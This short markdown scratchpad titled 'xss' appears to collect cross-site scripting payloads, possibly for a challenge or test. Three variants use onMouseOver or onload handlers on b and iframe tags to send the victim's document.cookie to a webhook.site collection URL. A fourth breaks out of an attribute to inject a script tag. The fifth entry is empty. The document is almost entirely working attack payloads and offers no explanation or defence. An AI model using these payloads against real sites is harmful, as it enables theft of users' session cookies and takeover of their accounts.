# xss
https://webhook.site/8e1bdfcd-374a-429f-a697-f18406382d44
- v1
```html
<b onMouseOver="self.location.href='https://webhook.site/8e1bdfcd-374a-429f-a697-f18406382d44'+escape(document.cookie)">test</b>
```
- v2 (can't use onload)
```html
<iframe onload="self.location.href='https://webhook.site/8e1bdfcd-374a-429f-a697-f18406382d44'+escape(document.cookie)">test</iframe>
```
- v3 
<iframe onMouseOver="self.location.href='https://webhook.site/8e1bdfcd-374a-429f-a697-f18406382d44'+escape(document.cookie)">test</iframe>

- v4 
"/> <script>alert(0)</script> <!--

- v5
